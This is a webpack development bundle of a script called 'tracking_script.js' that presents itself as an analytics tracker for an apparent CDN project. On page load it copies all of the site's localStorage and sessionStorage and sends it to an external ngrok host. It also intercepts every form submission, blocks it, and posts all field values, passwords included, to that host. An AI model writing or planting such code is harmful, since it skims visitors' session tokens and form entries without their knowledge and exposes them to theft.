/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./tracking_script.js":
/*!****************************!*\
  !*** ./tracking_script.js ***!
  \****************************/
/***/ (() => {

eval("// tracking.js\n\nwindow.analytics = {};\nfunction milierTracker(writeKey) {\n  window.analytics._writeKey = writeKey;\n  var script = document.createElement(\"script\");\n  script.type = \"application/javascript\";\n  script.onload = function () {\n    // window.analytics.page();\n  };\n  // script.src = `./demo1.js`;\n  var first = document.getElementsByTagName(\"script\")[0];\n  first.parentNode.insertBefore(script, first);\n  console.log(window.analytics);\n}\n\nfunction users(id, userDetails) {\n  console.log(\"============users=====\", id, \"==name=\", userDetails);\n}\n\nconst sendData = async (eventObject) => {\n  try {\n    const response = await fetch(\n      \"https://a7e6-49-204-116-178.ngrok-free.app/miler_cdn/event\",\n      {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/json\",\n        },\n        body: JSON.stringify(eventObject),\n      }\n    );\n    const data = await response.json();\n    console.log(\"Response from backend:\", data);\n  } catch (error) {\n    console.error(\"Error sending event:\", error);\n  }\n};\n\n(function () {\n  let startTime = Date.now();\n  let previousPath = window.location.pathname;\n\n  const capturePageData = () => {\n    const { host, hostname, href, origin, pathname, port, protocol } =\n      window.location;\n    const hostData = {\n      host,\n      hostname,\n      href,\n      origin,\n      pathname,\n      port,\n      protocol,\n    };\n    const sessionStorageData = { ...sessionStorage };\n    const localStorageData = { ...localStorage };\n    const timestamp = new Date().toString();\n\n    const pageData = {\n      hostData,\n      sessionStorageData,\n      localStorageData,\n      timestamp,\n    };\n\n    sendData(pageData);\n  };\n\n  const captureFormData = (form) => {\n    const formData = new FormData(form);\n    const formInputs = [...formData.entries()];\n\n    const inputData = formInputs.map(([key, value]) => ({ key, value }));\n\n    const formEventData = {\n      Action: form.action,\n      Method: form.method,\n      inputData,\n      timestamp: new Date().toString(),\n    };\n\n    sendData(formEventData);\n  };\n\n  const capturePageTime = () => {\n    const currentTime = Date.now();\n    const elapsedTimeInSeconds = Math.floor((currentTime - startTime) / 1000);\n\n    const timeEventData = {\n      Page: previousPath,\n      TimeSpent: elapsedTimeInSeconds,\n      timestamp: new Date().toString(),\n    };\n\n    sendData(timeEventData);\n\n    startTime = currentTime;\n  };\n\n  const handleRouteChange = () => {\n    capturePageTime();\n\n    const currentPath = window.location.pathname;\n    if (currentPath !== previousPath) {\n      capturePageData();\n      previousPath = currentPath;\n    }\n  };\n\n  window.addEventListener(\"load\", () => {\n    capturePageData();\n  });\n\n  window.addEventListener(\"submit\", (event) => {\n    event.preventDefault();\n    captureFormData(event.target);\n  });\n\n  window.addEventListener(\"popstate\", () => {\n    handleRouteChange();\n  });\n\n  // Start capturing page time when the script loads\n  capturePageTime();\n})();\n\n\n//# sourceURL=webpack://content-delivery-network/./tracking_script.js?");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module can't be inlined because the eval devtool is used.
/******/ 	var __webpack_exports__ = {};
/******/ 	__webpack_modules__["./tracking_script.js"]();
/******/ 	
/******/ })()
;